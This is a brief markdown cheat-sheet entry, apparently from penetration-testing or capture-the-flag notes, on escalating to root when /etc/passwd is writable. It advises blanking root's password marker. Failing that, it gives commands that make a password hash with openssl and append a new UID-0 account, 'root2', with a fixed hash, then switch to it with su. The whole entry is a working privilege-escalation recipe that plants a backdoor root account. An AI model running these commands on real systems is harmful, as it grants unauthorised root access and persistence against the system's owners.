# Write perms to etc passwd


## Try to remove the x in the root password first

## Try adding new user instead if the above doesn't succeed

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```
